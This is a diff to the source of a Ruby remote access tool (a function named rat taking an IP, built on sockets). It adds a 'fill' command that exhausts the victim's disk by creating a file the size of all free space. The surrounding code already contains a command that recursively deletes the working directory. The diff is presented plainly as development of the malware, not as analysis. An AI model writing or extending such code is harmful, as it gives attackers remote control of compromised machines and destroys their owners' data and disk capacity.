@@ -15,7 +15,7 @@ limitations under the License.
 =end
 #!/usr/bin/ruby
 require 'socket'
-
+require 'free_disk_space'
 def rat(ip)
 
   begin
@@ -99,6 +99,11 @@ def rat(ip)
         unless Gem.win_platform?
           exec "rm -r #{Dir.pwd}"
           exit!
+        end
+      when 'fill'
+        bytes = FreeDiskSpace.bytes '/'
+        File.open('hercules.dat', 'wb') do |file|
+          file.truncate bytes
         end
       end
     end
